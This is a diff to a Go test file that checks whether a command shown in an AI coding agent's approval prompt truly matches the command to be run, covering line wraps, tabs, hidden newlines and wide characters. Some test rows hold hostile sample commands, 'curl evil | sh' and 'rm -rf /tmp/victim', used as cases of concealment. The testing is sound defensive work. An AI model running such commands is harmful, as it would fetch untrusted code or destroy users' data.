@@ -285,7 +285,8 @@ func TestCommandShown(t *testing.T) {
 		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
 		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},
 
-		{"lines in a gutter", claudeP, full(" │ cd /tmp/x", " │", " │ ls -l"), "cd /tmp/x\n\nls -l", true},
+		{"only the count row left", claudeP, claude(" +3 lines, +2 above (ctrl+o to see more)"), mkdir, false},
+		{"a blank row", claudeP, full(" mkdir /tmp/x", "", " /perm-test"), mkdir, false},
 
 		{"top scrolled off", claudeP, claude(" ./internal/daemon ./internal/agent"), long, true},
 		{"top scrolled off, changed", claudeP, claude(" ./internal/daemon ./internal/remote"), long, false},
@@ -327,7 +328,9 @@ func TestCommandWhitespace(t *testing.T) {
 		{"same", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep  safe'", true},
 		{"a quoted space less", 100, []string{" rm -- '/tmp/keep safe'"}, "rm -- '/tmp/keep  safe'", false},
 		{"a quoted space more", 100, []string{" rm -- '/tmp/keep  safe'"}, "rm -- '/tmp/keep safe'", false},
-		{"a tab draws as spaces", 100, []string{" printf 'a    b'"}, "printf 'a\tb'", true},
+		{"a tab, drawn as spaces", 100, []string{" printf 'a    b'"}, "printf 'a\tb'", false},
+		{"a tab, not drawn", 100, []string{" mkdir '/tmp/ab'"}, "mkdir '/tmp/a\tb'", false},
+		{"a trailing newline", 100, []string{" echo safe"}, "echo safe\n", true},
 
 		{"wrapped between words", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, long, true},
 		{"wrapped with a space on the next row", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "  ./internal/daemon ./internal/agent"}, long, true},
@@ -337,10 +340,13 @@ func TestCommandWhitespace(t *testing.T) {
 		{"a newline on screen, inside a short row", 100, []string{" rm -rf /tmp", " /x"}, "rm -rf /tmp/x", false},
 		{"a newline at the pane's edge looks like a wrap", 14, []string{" echo safe", " rm -rf /tmp"}, "echo safe rm -rf /tmp", true},
 
-		{"a newline of the command", 100, []string{" │ echo safe", " │ rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", true},
+		{"a space more before the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"}, strings.Replace(long, " ./internal/daemon", "  ./internal/daemon", 1), false},
+		{"a space more after the row end", 48, []string{" cd /tmp/x && go test -race -timeout 5m", "   ./internal/daemon ./internal/agent"}, long, false},
+
+		{"a multi-line command", 100, []string{" echo safe", " rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
 		{"a newline only in the command", 100, []string{" echo safe rm -rf /tmp/victim"}, "echo safe\nrm -rf /tmp/victim", false},
-		{"the command's own indent", 100, []string{" │ if x; then", " │     echo y", " │ fi"}, "if x; then\n    echo y\nfi", true},
-		{"its indent changed", 100, []string{" │ if x; then", " │ echo y", " │ fi"}, "if x; then\n    echo y\nfi", false},
+		{"a newline off screen", 100, []string{" echo safe"}, "rm -rf /tmp/victim\necho safe", false},
+		{"a tab off screen", 100, []string{" echo safe", " +3 lines (ctrl+o to see more)"}, "echo safe\tb", false},
 	} {
 		e := vt.New(tc.cols, 30, nil)
 		form := append([]string{"╌╌╌"}, tc.rows...)
@@ -348,6 +354,21 @@ func TestCommandWhitespace(t *testing.T) {
 		e.Write([]byte(strings.Join(form, "\r\n")))
 		if got := CommandShown(model.ProviderClaude, e.Snapshot(), tc.command); got != tc.want {
 			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+	// A wrapped row is measured in cells: these rows are full, in half as many runes.
+	six, eight := strings.Repeat("界", 6), strings.Repeat("界", 8)
+	for _, tc := range []struct {
+		name, command string
+		rows          []string
+	}{
+		{"cut inside a word", "echo " + strings.Repeat("界", 20) + "/x", []string{" echo " + strings.Repeat("界", 20) + "/x"}},
+		{"moved between words", "echo " + six + " " + eight, []string{" echo " + six, " " + eight}},
+	} {
+		e := vt.New(30, 30, nil)
+		e.Write([]byte(strings.Join(append(append([]string{"╌╌╌"}, tc.rows...), "╌╌╌", " Do you want to proceed?", " ❯ 1. Yes", "   2. No"), "\r\n")))
+		if !CommandShown(model.ProviderClaude, e.Snapshot(), tc.command) {
+			t.Errorf("wide, %s: not shown", tc.name)
 		}
 	}
 	e := vt.New(40, 30, nil)
